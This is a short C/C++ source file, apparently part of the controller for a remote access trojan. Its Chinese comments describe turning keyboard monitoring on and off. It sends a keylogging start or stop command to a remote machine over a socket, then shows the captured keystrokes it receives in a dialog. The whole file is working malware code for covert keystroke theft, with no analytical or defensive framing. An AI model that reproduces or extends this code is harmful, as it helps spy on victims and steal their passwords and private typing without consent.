#include "KeyBoard.h"


HWND hKeyDlg = NULL;

//发送开启或关闭键盘监控命令
BOOL KeyCmdSend(SOCKET sockfd,HWND hDlg,BOOL flag)
{
	hKeyDlg = hDlg;
	RatProto ratPro;
	if (flag)
	{
		ratPro.RatId = KEY_OK;
	}
	else
	{
		ratPro.RatId = KEY_CANCEL;
	}
	ratPro.RatLen = sizeof(RatProto);

	SendCmd(sockfd,(char*)(&ratPro),sizeof(RatProto));

	return TRUE;
}

//接收键盘记录结果，只有输入焦点改变时才会发送反馈
BOOL KeyReply(SOCKET sockfd,int dwRecvSize)
{
	int dwSize = ((RatProto*)szRecvCmd)->RatLen - sizeof(RatProto);
	if (dwSize)
	{
		char* pData = szRecvCmd+sizeof(RatProto);
		SetDlgItemText(hKeyDlg,IDC_EDIT1,pData);
	}


	return TRUE;
}